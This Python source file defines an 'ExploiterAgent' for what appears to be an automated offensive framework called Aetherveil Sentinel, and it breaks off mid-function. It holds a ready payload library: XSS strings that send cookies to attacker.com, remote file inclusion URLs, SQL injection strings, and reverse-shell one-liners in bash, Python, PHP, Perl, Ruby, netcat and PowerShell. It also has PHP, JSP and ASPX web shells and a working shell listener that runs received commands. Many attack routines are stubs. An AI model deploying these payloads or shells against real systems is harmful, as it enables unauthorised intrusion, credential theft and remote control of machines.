"""
Exploiter Agent for Aetherveil Sentinel
Specialized agent for exploit execution and payload generation
"""

import asyncio
import logging
import json
import random
import base64
import hashlib
import subprocess
import socket
import threading
from typing import Dict, List, Optional, Any, Tuple
from datetime import datetime
from urllib.parse import urlparse, quote
import aiohttp
import paramiko
from scapy.all import *
import requests

from .base_agent import BaseAgent
from .communication import AgentCommunicator
from config.config import config

logger = logging.getLogger(__name__)

class ExploiterAgent(BaseAgent):
    """Advanced exploiter agent for vulnerability exploitation"""
    
    def __init__(self, agent_id: str):
        super().__init__(
            agent_id=agent_id,
            agent_type="exploiter",
            capabilities=[
                "exploit_execution",
                "payload_generation",
                "privilege_escalation",
                "persistence_establishment",
                "lateral_movement",
                "backdoor_deployment",
                "reverse_shell",
                "buffer_overflow",
                "sql_injection_exploit",
                "web_shell_upload",
                "service_exploitation"
            ]
        )
        
        self.communicator = AgentCommunicator(agent_id)
        self.exploit_db = self._load_exploit_database()
        self.payload_templates = self._load_payload_templates()
        self.reverse_shell_listeners = {}
        self.active_sessions = {}
        self.exploit_modules = {}
        
    def _register_handlers(self):
        """Register task handlers"""
        self.register_task_handler("exploit_execution", self.exploit_execution)
        self.register_task_handler("payload_generation", self.payload_generation)
        self.register_task_handler("privilege_escalation", self.privilege_escalation)
        self.register_task_handler("persistence_establishment", self.persistence_establishment)
        self.register_task_handler("lateral_movement", self.lateral_movement)
        self.register_task_handler("backdoor_deployment", self.backdoor_deployment)
        self.register_task_handler("reverse_shell", self.reverse_shell)
        self.register_task_handler("buffer_overflow", self.buffer_overflow)
        self.register_task_handler("sql_injection_exploit", self.sql_injection_exploit)
        self.register_task_handler("web_shell_upload", self.web_shell_upload)
        self.register_task_handler("service_exploitation", self.service_exploitation)
        self.register_task_handler("comprehensive_exploit", self.comprehensive_exploit)

    async def initialize(self):
        """Initialize exploiter agent"""
        await super().initialize()
        await self.communicator.initialize()
        
        # Load exploit modules
        self._load_exploit_modules()
        
        logger.info(f"Exploiter agent {self.agent_id} initialized")

    def _load_exploit_database(self) -> Dict[str, Any]:
        """Load exploit database"""
        return {
            "web_exploits": {
                "sql_injection": {
                    "type": "injection",
                    "payloads": [
                        "' UNION SELECT 1,2,3,4,5,6,7,8,9,10--",
                        "' UNION SELECT @@version,user(),database(),4,5,6,7,8,9,10--",
                        "'; INSERT INTO users (username, password) VALUES ('admin', 'password');--"
                    ],
                    "techniques": ["union_based", "blind", "time_based", "error_based"]
                },
                "xss": {
                    "type": "injection",
                    "payloads": [
                        "<script>document.location='http://attacker.com/steal.php?cookie='+document.cookie</script>",
                        "<img src=x onerror=fetch('http://attacker.com/steal.php?cookie='+document.cookie)>",
                        "<svg onload=eval(atob('YWxlcnQoJ1hTUycpOw=='))>"
                    ],
                    "techniques": ["stored", "reflected", "dom_based"]
                },
                "lfi": {
                    "type": "file_inclusion",
                    "payloads": [
                        "../../../../etc/passwd",
                        "php://filter/convert.base64-encode/resource=index.php",
                        "data://text/plain;base64,PD9waHAgcGhwaW5mbygpOyA/Pg=="
                    ],
                    "techniques": ["path_traversal", "php_wrappers", "log_poisoning"]
                },
                "rfi": {
                    "type": "file_inclusion",
                    "payloads": [
                        "http://attacker.com/shell.txt",
                        "ftp://attacker.com/shell.txt",
                        "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8+"
                    ],
                    "techniques": ["remote_inclusion", "data_wrapper"]
                }
            },
            "service_exploits": {
                "ssh": {
                    "brute_force": {
                        "technique": "credential_brute_force",
                        "common_credentials": [
                            ("root", "root"), ("admin", "admin"), ("root", "password"),
                            ("admin", "password"), ("root", "123456"), ("admin", "123456")
                        ]
                    },
                    "key_based": {
                        "technique": "ssh_key_exploitation",
                        "methods": ["weak_keys", "default_keys", "exposed_keys"]
                    }
                },
                "ftp": {
                    "anonymous": {
                        "technique": "anonymous_access",
                        "credentials": [("anonymous", "anonymous"), ("ftp", "ftp")]
                    },
                    "bounce_attack": {
                        "technique": "ftp_bounce",
                        "methods": ["port_scanning", "service_enumeration"]
                    }
                },
                "smtp": {
                    "open_relay": {
                        "technique": "mail_relay",
                        "methods": ["spam_sending", "phishing"]
                    },
                    "user_enumeration": {
                        "technique": "user_enum",
                        "methods": ["vrfy", "expn", "rcpt_to"]
                    }
                }
            },
            "network_exploits": {
                "arp_poisoning": {
                    "technique": "arp_spoofing",
                    "methods": ["mitm", "session_hijacking"]
                },
                "dns_poisoning": {
                    "technique": "dns_spoofing",
                    "methods": ["cache_poisoning", "response_manipulation"]
                },
                "dhcp_starvation": {
                    "technique": "dhcp_exhaustion",
                    "methods": ["ip_pool_exhaustion", "rogue_dhcp"]
                }
            }
        }

    def _load_payload_templates(self) -> Dict[str, Any]:
        """Load payload templates"""
        return {
            "reverse_shells": {
                "bash": "bash -i >& /dev/tcp/{host}/{port} 0>&1",
                "python": "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{host}\",{port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'",
                "php": "php -r '$sock=fsockopen(\"{host}\",{port});exec(\"/bin/sh -i <&3 >&3 2>&3\");'",
                "perl": "perl -e 'use Socket;$i=\"{host}\";$p={port};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'",
                "ruby": "ruby -rsocket -e'f=TCPSocket.open(\"{host}\",{port}).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'",
                "netcat": "nc -e /bin/sh {host} {port}",
                "powershell": "powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient('{host}',{port});$stream = $client.GetStream();[byte[]]$bytes = 0..255|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
            },
            "web_shells": {
                "php": "<?php system($_GET['cmd']); ?>",
                "php_advanced": "<?php if(isset($_REQUEST['cmd'])){ echo '<pre>'; $cmd = ($_REQUEST['cmd']); system($cmd); echo '</pre>'; die; }?>",
                "jsp": "<%@ page import=\"java.io.*\" %> <% String cmd = request.getParameter(\"cmd\"); String output = \"\"; try { Scanner s = new Scanner(Runtime.getRuntime().exec(cmd).getInputStream()).useDelimiter(\"\\\\A\"); output = s.hasNext() ? s.next() : \"\"; s.close(); } catch (Exception e) { e.printStackTrace(); } %> <pre><%=output%></pre>",
                "aspx": "<%@ Page Language=\"C#\" %> <%@ Import Namespace=\"System.Diagnostics\" %> <script runat=\"server\"> void Page_Load(object sender, EventArgs e) { Response.Write(\"<pre>\"); string cmd = Request.QueryString[\"cmd\"]; ProcessStartInfo psi = new ProcessStartInfo(); psi.FileName = \"cmd.exe\"; psi.Arguments = \"/c \"+cmd; psi.RedirectStandardOutput = true; psi.UseShellExecute = false; Process p = Process.Start(psi); StreamReader stmrdr = p.StandardOutput; string s = stmrdr.ReadToEnd(); stmrdr.Close(); Response.Write(s); Response.Write(\"</pre>\"); } </script>"
            },
            "buffer_overflow": {
                "pattern": "A" * 100,
                "shellcode": "\\x90" * 100,  # NOP sled
                "ret_address": "\\x41\\x41\\x41\\x41"  # Placeholder
            },
            "sql_injection": {
                "union_based": "' UNION SELECT {columns} FROM {table}--",
                "blind": "' AND (SELECT SUBSTRING(@@version,1,1))='{char}'--",
                "time_based": "'; WAITFOR DELAY '0:0:5'--",
                "error_based": "' AND (SELECT COUNT(*) FROM sysobjects)--"
            }
        }

    def _load_exploit_modules(self):
        """Load exploit modules"""
        self.exploit_modules = {
            "web": WebExploitModule(self),
            "service": ServiceExploitModule(self),
            "network": NetworkExploitModule(self),
            "system": SystemExploitModule(self)
        }

    async def execute_primary_function(self, target: str, parameters: Dict[str, Any]) -> Dict[str, Any]:
        """Execute comprehensive exploitation"""
        return await self.comprehensive_exploit(target, parameters)

    async def exploit_execution(self, target: str, parameters: Dict[str, Any]) -> Dict[str, Any]:
        """Execute specific exploit"""
        try:
            exploit_type = parameters.get("exploit_type", "web")
            exploit_name = parameters.get("exploit_name", "sql_injection")
            
            results = {
                "target": target,
                "exploit_type": exploit_type,
                "exploit_name": exploit_name,
                "timestamp": datetime.utcnow().isoformat(),
                "execution_result": {}
            }
            
            # Get exploit module
            exploit_module = self.exploit_modules.get(exploit_type)
            if not exploit_module:
                return {"error": f"Unknown exploit type: {exploit_type}"}
            
            # Execute exploit
            exploit_result = await exploit_module.execute_exploit(target, exploit_name, parameters)
            results["execution_result"] = exploit_result
            
            # Log successful exploitation
            if exploit_result.get("success"):
                await self.send_vulnerability_found({
                    "type": "successful_exploitation",
                    "target": target,
                    "exploit": exploit_name,
                    "result": exploit_result
                })
            
            self.log_activity("exploit_execution", results)
            return results
            
        except Exception as e:
            logger.error(f"Exploit execution failed: {e}")
            return {"error": str(e)}

    async def payload_generation(self, target: str, parameters: Dict[str, Any]) -> Dict[str, Any]:
        """Generate payloads for exploitation"""
        try:
            payload_type = parameters.get("payload_type", "reverse_shell")
            language = parameters.get("language", "bash")
            host = parameters.get("host", "127.0.0.1")
            port = parameters.get("port", 4444)
            
            results = {
                "target": target,
                "payload_type": payload_type,
                "language": language,
                "timestamp": datetime.utcnow().isoformat(),
                "payloads": []
            }
            
            # Generate payloads
            if payload_type == "reverse_shell":
                payload = await self._generate_reverse_shell_payload(language, host, port)
                results["payloads"].append({
                    "type": "reverse_shell",
                    "language": language,
                    "payload": payload,
                    "encoded": base64.b64encode(payload.encode()).decode()
                })
            
            elif payload_type == "web_shell":
                payload = await self._generate_web_shell_payload(language)
                results["payloads"].append({
                    "type": "web_shell",
                    "language": language,
                    "payload": payload,
                    "encoded": base64.b64encode(payload.encode()).decode()
                })
            
            elif payload_type == "buffer_overflow":
                payload = await self._generate_buffer_overflow_payload(parameters)
                results["payloads"].append({
                    "type": "buffer_overflow",
                    "payload": payload,
                    "size": len(payload)
                })
            
            self.log_activity("payload_generation", results)
            return results
            
        except Exception as e:
            logger.error(f"Payload generation failed: {e}")
            return {"error": str(e)}

    async def _generate_reverse_shell_payload(self, language: str, host: str, port: int) -> str:
        """Generate reverse shell payload"""
        try:
            template = self.payload_templates["reverse_shells"].get(language)
            if not template:
                return self.payload_templates["reverse_shells"]["bash"]
            
            return template.format(host=host, port=port)
            
        except Exception as e:
            logger.error(f"Reverse shell payload generation failed: {e}")
            return ""

    async def _generate_web_shell_payload(self, language: str) -> str:
        """Generate web shell payload"""
        try:
            template = self.payload_templates["web_shells"].get(language)
            if not template:
                return self.payload_templates["web_shells"]["php"]
            
            return template
            
        except Exception as e:
            logger.error(f"Web shell payload generation failed: {e}")
            return ""

    async def _generate_buffer_overflow_payload(self, parameters: Dict[str, Any]) -> str:
        """Generate buffer overflow payload"""
        try:
            buffer_size = parameters.get("buffer_size", 1024)
            offset = parameters.get("offset", 112)
            return_address = parameters.get("return_address", "\\x41\\x41\\x41\\x41")
            
            payload = "A" * offset
            payload += return_address
            payload += "\\x90" * (buffer_size - offset - 4)  # NOP sled
            
            return payload
            
        except Exception as e:
            logger.error(f"Buffer overflow payload generation failed: {e}")
            return ""

    async def privilege_escalation(self, target: str, parameters: Dict[str, Any]) -> Dict[str, Any]:
        """Perform privilege escalation"""
        try:
            method = parameters.get("method", "sudo_exploit")
            
            results = {
                "target": target,
                "method": method,
                "timestamp": datetime.utcnow().isoformat(),
                "escalation_result": {}
            }
            
            # Execute privilege escalation
            if method == "sudo_exploit":
                result = await self._sudo_privilege_escalation(target, parameters)
            elif method == "kernel_exploit":
                result = await self._kernel_privilege_escalation(target, parameters)
            elif method == "suid_exploit":
                result = await self._suid_privilege_escalation(target, parameters)
            else:
                result = {"error": f"Unknown escalation method: {method}"}
            
            results["escalation_result"] = result
            
            self.log_activity("privilege_escalation", results)
            return results
            
        except Exception as e:
            logger.error(f"Privilege escalation failed: {e}")
            return {"error": str(e)}

    async def _sudo_privilege_escalation(self, target: str, parameters: Dict[str, Any]) -> Dict[str, Any]:
        """Attempt sudo privilege escalation"""
        try:
            # This is a simplified implementation
            # In practice, you would check for sudo misconfigurations
            result = {
                "method": "sudo_exploit",
                "success": False,
                "details": "Sudo exploit not implemented in demo"
            }
            
            return result
            
        except Exception as e:
            logger.error(f"Sudo privilege escalation failed: {e}")
            return {"error": str(e)}

    async def _kernel_privilege_escalation(self, target: str, parameters: Dict[str, Any]) -> Dict[str, Any]:
        """Attempt kernel privilege escalation"""
        try:
            # This is a simplified implementation
            # In practice, you would check for kernel vulnerabilities
            result = {
                "method": "kernel_exploit",
                "success": False,
                "details": "Kernel exploit not implemented in demo"
            }
            
            return result
            
        except Exception as e:
            logger.error(f"Kernel privilege escalation failed: {e}")
            return {"error": str(e)}

    async def _suid_privilege_escalation(self, target: str, parameters: Dict[str, Any]) -> Dict[str, Any]:
        """Attempt SUID privilege escalation"""
        try:
            # This is a simplified implementation
            # In practice, you would check for SUID binaries
            result = {
                "method": "suid_exploit",
                "success": False,
                "details": "SUID exploit not implemented in demo"
            }
            
            return result
            
        except Exception as e:
            logger.error(f"SUID privilege escalation failed: {e}")
            return {"error": str(e)}

    async def persistence_establishment(self, target: str, parameters: Dict[str, Any]) -> Dict[str, Any]:
        """Establish persistence on target"""
        try:
            method = parameters.get("method", "backdoor")
            
            results = {
                "target": target,
                "method": method,
                "timestamp": datetime.utcnow().isoformat(),
                "persistence_result": {}
            }
            
            # Execute persistence establishment
            if method == "backdoor":
                result = await self._establish_backdoor(target, parameters)
            elif method == "scheduled_task":
                result = await self._establish_scheduled_task(target, parameters)
            elif method == "service":
                result = await self._establish_service_persistence(target, parameters)
            else:
                result = {"error": f"Unknown persistence method: {method}"}
            
            results["persistence_result"] = result
            
            self.log_activity("persistence_establishment", results)
            return results
            
        except Exception as e:
            logger.error(f"Persistence establishment failed: {e}")
            return {"error": str(e)}

    async def _establish_backdoor(self, target: str, parameters: Dict[str, Any]) -> Dict[str, Any]:
        """Establish backdoor persistence"""
        try:
            # This is a simplified implementation
            result = {
                "method": "backdoor",
                "success": False,
                "details": "Backdoor establishment not implemented in demo"
            }
            
            return result
            
        except Exception as e:
            logger.error(f"Backdoor establishment failed: {e}")
            return {"error": str(e)}

    async def _establish_scheduled_task(self, target: str, parameters: Dict[str, Any]) -> Dict[str, Any]:
        """Establish scheduled task persistence"""
        try:
            # This is a simplified implementation
            result = {
                "method": "scheduled_task",
                "success": False,
                "details": "Scheduled task persistence not implemented in demo"
            }
            
            return result
            
        except Exception as e:
            logger.error(f"Scheduled task persistence failed: {e}")
            return {"error": str(e)}

    async def _establish_service_persistence(self, target: str, parameters: Dict[str, Any]) -> Dict[str, Any]:
        """Establish service persistence"""
        try:
            # This is a simplified implementation
            result = {
                "method": "service",
                "success": False,
                "details": "Service persistence not implemented in demo"
            }
            
            return result
            
        except Exception as e:
            logger.error(f"Service persistence failed: {e}")
            return {"error": str(e)}

    async def lateral_movement(self, target: str, parameters: Dict[str, Any]) -> Dict[str, Any]:
        """Perform lateral movement"""
        try:
            method = parameters.get("method", "ssh_keys")
            
            results = {
                "target": target,
                "method": method,
                "timestamp": datetime.utcnow().isoformat(),
                "movement_result": {}
            }
            
            # Execute lateral movement
            if method == "ssh_keys":
                result = await self._lateral_movement_ssh(target, parameters)
            elif method == "smb":
                result = await self._lateral_movement_smb(target, parameters)
            elif method == "rdp":
                result = await self._lateral_movement_rdp(target, parameters)
            else:
                result = {"error": f"Unknown lateral movement method: {method}"}
            
            results["movement_result"] = result
            
            self.log_activity("lateral_movement", results)
            return results
            
        except Exception as e:
            logger.error(f"Lateral movement failed: {e}")
            return {"error": str(e)}

    async def _lateral_movement_ssh(self, target: str, parameters: Dict[str, Any]) -> Dict[str, Any]:
        """Perform SSH lateral movement"""
        try:
            # This is a simplified implementation
            result = {
                "method": "ssh_keys",
                "success": False,
                "details": "SSH lateral movement not implemented in demo"
            }
            
            return result
            
        except Exception as e:
            logger.error(f"SSH lateral movement failed: {e}")
            return {"error": str(e)}

    async def _lateral_movement_smb(self, target: str, parameters: Dict[str, Any]) -> Dict[str, Any]:
        """Perform SMB lateral movement"""
        try:
            # This is a simplified implementation
            result = {
                "method": "smb",
                "success": False,
                "details": "SMB lateral movement not implemented in demo"
            }
            
            return result
            
        except Exception as e:
            logger.error(f"SMB lateral movement failed: {e}")
            return {"error": str(e)}

    async def _lateral_movement_rdp(self, target: str, parameters: Dict[str, Any]) -> Dict[str, Any]:
        """Perform RDP lateral movement"""
        try:
            # This is a simplified implementation
            result = {
                "method": "rdp",
                "success": False,
                "details": "RDP lateral movement not implemented in demo"
            }
            
            return result
            
        except Exception as e:
            logger.error(f"RDP lateral movement failed: {e}")
            return {"error": str(e)}

    async def backdoor_deployment(self, target: str, parameters: Dict[str, Any]) -> Dict[str, Any]:
        """Deploy backdoor"""
        try:
            backdoor_type = parameters.get("backdoor_type", "web_shell")
            
            results = {
                "target": target,
                "backdoor_type": backdoor_type,
                "timestamp": datetime.utcnow().isoformat(),
                "deployment_result": {}
            }
            
            # Deploy backdoor
            if backdoor_type == "web_shell":
                result = await self._deploy_web_shell(target, parameters)
            elif backdoor_type == "reverse_shell":
                result = await self._deploy_reverse_shell(target, parameters)
            elif backdoor_type == "bind_shell":
                result = await self._deploy_bind_shell(target, parameters)
            else:
                result = {"error": f"Unknown backdoor type: {backdoor_type}"}
            
            results["deployment_result"] = result
            
            self.log_activity("backdoor_deployment", results)
            return results
            
        except Exception as e:
            logger.error(f"Backdoor deployment failed: {e}")
            return {"error": str(e)}

    async def _deploy_web_shell(self, target: str, parameters: Dict[str, Any]) -> Dict[str, Any]:
        """Deploy web shell backdoor"""
        try:
            # This is a simplified implementation
            result = {
                "backdoor_type": "web_shell",
                "success": False,
                "details": "Web shell deployment not implemented in demo"
            }
            
            return result
            
        except Exception as e:
            logger.error(f"Web shell deployment failed: {e}")
            return {"error": str(e)}

    async def _deploy_reverse_shell(self, target: str, parameters: Dict[str, Any]) -> Dict[str, Any]:
        """Deploy reverse shell backdoor"""
        try:
            # This is a simplified implementation
            result = {
                "backdoor_type": "reverse_shell",
                "success": False,
                "details": "Reverse shell deployment not implemented in demo"
            }
            
            return result
            
        except Exception as e:
            logger.error(f"Reverse shell deployment failed: {e}")
            return {"error": str(e)}

    async def _deploy_bind_shell(self, target: str, parameters: Dict[str, Any]) -> Dict[str, Any]:
        """Deploy bind shell backdoor"""
        try:
            # This is a simplified implementation
            result = {
                "backdoor_type": "bind_shell",
                "success": False,
                "details": "Bind shell deployment not implemented in demo"
            }
            
            return result
            
        except Exception as e:
            logger.error(f"Bind shell deployment failed: {e}")
            return {"error": str(e)}

    async def reverse_shell(self, target: str, parameters: Dict[str, Any]) -> Dict[str, Any]:
        """Execute reverse shell"""
        try:
            host = parameters.get("host", "127.0.0.1")
            port = parameters.get("port", 4444)
            method = parameters.get("method", "nc")
            
            results = {
                "target": target,
                "host": host,
                "port": port,
                "method": method,
                "timestamp": datetime.utcnow().isoformat(),
                "shell_result": {}
            }
            
            # Start listener
            listener_id = await self._start_reverse_shell_listener(host, port)
            
            # Execute reverse shell
            shell_result = await self._execute_reverse_shell(target, host, port, method)
            results["shell_result"] = shell_result
            
            # Store session if successful
            if shell_result.get("success"):
                self.active_sessions[listener_id] = {
                    "target": target,
                    "host": host,
                    "port": port,
                    "method": method,
                    "established": datetime.utcnow().isoformat()
                }
            
            self.log_activity("reverse_shell", results)
            return results
            
        except Exception as e:
            logger.error(f"Reverse shell failed: {e}")
            return {"error": str(e)}

    async def _start_reverse_shell_listener(self, host: str, port: int) -> str:
        """Start reverse shell listener"""
        try:
            listener_id = hashlib.md5(f"{host}:{port}".encode()).hexdigest()
            
            # Start listener in background thread
            listener_thread = threading.Thread(
                target=self._reverse_shell_listener_thread,
                args=(host, port, listener_id)
            )
            listener_thread.daemon = True
            listener_thread.start()
            
            self.reverse_shell_listeners[listener_id] = {
                "host": host,
                "port": port,
                "thread": listener_thread,
                "active": True
            }
            
            return listener_id
            
        except Exception as e:
            logger.error(f"Failed to start reverse shell listener: {e}")
            return ""

    def _reverse_shell_listener_thread(self, host: str, port: int, listener_id: str):
        """Reverse shell listener thread"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            sock.bind((host, port))
            sock.listen(1)
            
            logger.info(f"Reverse shell listener started on {host}:{port}")
            
            while self.reverse_shell_listeners.get(listener_id, {}).get("active", False):
                try:
                    client, addr = sock.accept()
                    logger.info(f"Reverse shell connection from {addr}")
                    
                    # Handle connection
                    self._handle_reverse_shell_connection(client, addr, listener_id)
                    
                except Exception as e:
                    logger.error(f"Error in reverse shell listener: {e}")
                    break
            
            sock.close()
            
        except Exception as e:
            logger.error(f"Reverse shell listener thread error: {e}")

    def _handle_reverse_shell_connection(self, client: socket.socket, addr: tuple, listener_id: str):
        """Handle reverse shell connection"""
        try:
            # Send welcome message
            client.send(b"Welcome to reverse shell\n")
            
            # Basic shell loop
            while True:
                client.send(b"$ ")
                command = client.recv(1024).decode().strip()
                
                if command.lower() in ['exit', 'quit']:
                    break
                
                if command:
                    try:
                        result = subprocess.run(
                            command,
                            shell=True,
                            capture_output=True,
                            text=True,
                            timeout=30
                        )
                        
                        output = result.stdout + result.stderr
                        client.send(output.encode())
                        
                    except subprocess.TimeoutExpired:
                        client.send(b"Command timed out\n")
                    except Exception as e:
                        client.send(f"Error: {e}\n".encode())
            
            client.close()
            
        except Exception as e:
            logger.error(f"Error handling reverse shell connection: {e}")

    async def _execute_reverse_shell(self, target: str, host: str, port: int, method: str) -> Dict[str, Any]:
        """Execute reverse shell on target"""
        try:
            # This is a simplified implementation
            # In practice, you would execute the reverse shell payload on the target
            result = {
                "method": method,
                "success": False,
                "details": "Reverse shell execution not implemented in demo"
            }
            
            return result
            
        except Exception as e:
            logger.error(f"Reverse shell execution failed: {e}")
            return {"error": str(e)}

    async def buffer_overflow(self, target: str, parameters: Dict[str, Any]) -> Dict[str, Any]:
        """Execute buffer overflow exploit"""
        try:
            service = parameters.get("service", "unknown")
            port = parameters.get("port", 0)
            
            results = {
                "target": target,
                "service": service,
                "port": port,
                "timestamp": datetime.utcnow().isoformat(),
                "overflow_result": {}
            }
            
            # Generate buffer overflow payload
            payload = await self._generate_buffer_overflow_payload(parameters)
            
            # Execute buffer overflow
            overflow_result = await self._execute_buffer_overflow(target, port, payload)
            results["overflow_result"] = overflow_result
            
            self.log_activity("buffer_overflow", results)
            return results
            
        except Exception as e:
            logger.error(f"Buffer overflow failed: {e}")
            return {"error": str(e)}

    async def _execute_buffer_overflow(self, target: str, port: int, payload: str) -> Dict[str, Any]:
        """Execute buffer overflow exploit"""
        try:
            # This is a simplified implementation
            # In practice, you would send the payload to the vulnerable service
            result = {
                "success": False,
                "details": "Buffer overflow execution not implemented in demo"
            }
            
            return result
            
        except Exception as e:
            logger.error(f"Buffer overflow execution failed: {e}")
            return {"error": str(e)}

    async def sql_injection_exploit(self, target: str, parameters: Dict[str, Any]) -> Dict[str, Any]:
        """Execute SQL injection exploit"""
        try:
            url = parameters.get("url", f"http://{target}")
            parameter = parameters.get("parameter", "id")
            technique = parameters.get("technique", "union_based")
            
            results = {
                "target": target,
                "url": url,
                "parameter": parameter,
                "technique": technique,
                "timestamp": datetime.utcnow().isoformat(),
                "injection_result": {}
            }
            
            # Execute SQL injection
            injection_result = await self._execute_sql_injection(url, parameter, technique)
            results["injection_result"] = injection_result
            
            self.log_activity("sql_injection_exploit", results)
            return results
            
        except Exception as e:
            logger.error(f"SQL injection exploit failed: {e}")
            return {"error": str(e)}

    async def _execute_sql_injection(self, url: str, parameter: str, technique: str) -> Dict[str, Any]:
        """Execute SQL injection"""
        try:
            # This is a simplified implementation
            # In practice, you would execute the SQL injection payload
            result = {
                "technique": technique,
                "success": False,
                "details": "SQL injection execution not implemented in demo"
            }
            
            return result
            
        except Exception as e:
            logger.error(f"SQL injection execution failed: {e}")
            return {"error": str(e)}

    async def web_shell_upload(self, target: str, parameters: Dict[str, Any]) -> Dict[str, Any]:
        """Upload web shell"""
        try:
            url = parameters.get("url", f"http://{target}")
            shell_type = parameters.get("shell_type", "php")
            
            results = {
                "target": target,
                "url": url,
                "shell_type": shell_type,
                "timestamp": datetime.utcnow().isoformat(),
                "upload_result": {}
            }
            
            # Generate web shell
            shell_payload = await self._generate_web_shell_payload(shell_type)
            
            # Upload web shell
            upload_result = await self._upload_web_shell(url, shell_payload, shell_type)
            results["upload_result"] = upload_result
            
            self.log_activity("web_shell_upload", results)
            return results
            
        except Exception as e:
            logger.error(f"Web shell upload failed: {e}")
            return {"error": str(e)}

    async def _upload_web_shell(self, url: str, payload: str, shell_type: str) -> Dict[str, Any]:
        """Upload web shell payload"""
        try:
            # This is a simplified implementation
            # In practice, you would upload the web shell to the target
            result = {
                "shell_type": shell_type,
                "success": False,
                "details": "Web shell upload not implemented in demo"
            }
            
            return result
            
        except Exception as e:
            logger.error(f"Web shell upload failed: {e}")
            return {"error": str(e)}

    async def service_exploitation(self, target: str, parameters: Dict[str, Any]) -> Dict[str, Any]:
        """Exploit specific service"""
        try:
            service = parameters.get("service", "ssh")
            port = parameters.get("port", 22)
            
            results = {
                "target": target,
                "service": service,
                "port": port,
                "timestamp": datetime.utcnow().isoformat(),
                "exploitation_result": {}
            }
            
            # Execute service exploitation
            service_module = self.exploit_modules.get("service")
            if service_module:
                exploitation_result = await service_module.exploit_service(target, service, port, parameters)
                results["exploitation_result"] = exploitation_result
            else:
                results["exploitation_result"] = {"error": "Service exploitation module not found"}
            
            self.log_activity("service_exploitation", results)
            return results
            
        except Exception as e:
            logger.error(f"Service exploitation failed: {e}")
            return {"error": str(e)}

    async def comprehensive_exploit(self, target: str, parameters: Dict[str, Any]) -> Dict[str, Any]:
        """Perform comprehensive exploitation"""
        try:
            results = {
                "target": target,
                "timestamp": datetime.utcnow().isoformat(),
                "comprehensive_exploit": {}
            }
            
            # Perform all exploitation tasks
            exploit_tasks = [
                ("payload_generation", self.payload_generation),
                ("exploit_execution", self.exploit_execution),
                ("backdoor_deployment", self.backdoor_deployment),
                ("privilege_escalation", self.privilege_escalation),
                ("persistence_establishment", self.persistence_establishment),
                ("lateral_movement", self.lateral_movement)
            ]
            
            for task_name, task_func in exploit_tasks:
                try:
                    task_result = await task_func(target, parameters)
                    results["comprehensive_exploit"][task_name] = task_result
                    
                    # Add delay between tasks
                    await self.sleep_with_jitter(random.uniform(5, 10))
                    
                except Exception as e:
                    logger.error(f"Task {task_name} failed: {e}")
                    results["comprehensive_exploit"][task_name] = {"error": str(e)}
            
            # Send intelligence data to coordinator
            await self.send_intelligence_data(results)
            
            self.log_activity("comprehensive_exploit", results)
            return results
            
        except Exception as e:
            logger.error(f"Comprehensive exploit failed: {e}")
            return {"error": str(e)}

    async def shutdown(self):
        """Shutdown exploiter agent"""
        try:
            # Stop reverse shell listeners
            for listener_id, listener_info in self.reverse_shell_listeners.items():
                listener_info["active"] = False
            
            # Close active sessions
            self.active_sessions.clear()
            
            await self.communicator.shutdown()
            await super().shutdown()
        except Exception as e:
            logger.error(f"Error shutting down exploiter agent: {e}")

# Exploit modules
class WebExploitModule:
    """Web exploitation module"""
    
    def __init__(self, agent):
        self.agent = agent
    
    async def execute_exploit(self, target: str, exploit_name: str, parameters: Dict[str, Any]) -> Dict[str, Any]:
        """Execute web exploit"""
        try:
            if exploit_name == "sql_injection":
                return await self._sql_injection_exploit(target, parameters)
            elif exploit_name == "xss":
                return await self._xss_exploit(target, parameters)
            elif exploit_name == "lfi":
                return await self._lfi_exploit(target, parameters)
            elif exploit_name == "rfi":
                return await self._rfi_exploit(target, parameters)
            else:
                return {"error": f"Unknown web exploit: {exploit_name}"}
                
        except Exception as e:
            return {"error": str(e)}
    
    async def _sql_injection_exploit(self, target: str, parameters: Dict[str, Any]) -> Dict[str, Any]:
        """Execute SQL injection exploit"""
        return {"success": False, "details": "SQL injection exploit not implemented in demo"}
    
    async def _xss_exploit(self, target: str, parameters: Dict[str, Any]) -> Dict[str, Any]:
        """Execute XSS exploit"""
        return {"success": False, "details": "XSS exploit not implemented in demo"}
    
    async def _lfi_exploit(self, target: str, parameters: Dict[str, Any]) -> Dict[str, Any]:
        """Execute LFI exploit"""
        return {"success": False, "details": "LFI exploit not implemented in demo"}
    
    async def _rfi_exploit(self, target: str, parameters: Dict[str, Any]) -> Dict[str, Any]:
        """Execute RFI exploit"""
        return {"success": False, "details": "RFI exploit not implemented in demo"}

class ServiceExploitModule:
    """Service exploitation module"""
    
    def __init__(self, agent):
        self.agent = agent
    
    async def execute_exploit(self, target: str, exploit_name: str, parameters: Dict[str, Any]) -> Dict[str, Any]:
        """Execute service exploit"""
        try:
            if exploit_name == "ssh_brute_force":
                return await self._ssh_brute_force(target, parameters)
            elif exploit_name == "ftp_anonymous":
                return await self._ftp_anonymous_exploit(target, parameters)
            elif exploit_name == "smtp_relay":
                return await self._smtp_relay_exploit(target, parameters)
            else:
                return {"error": f"Unknown service exploit: {exploit_name}"}
                
        except Exception as e:
            return {"error": str(e)}
    
    async def exploit_service(self, target: str, service: str, port: int, parameters: Dict[str, Any]) -> Dict[str, Any]:
        """Exploit specific service"""
        try:
            if service == "ssh":
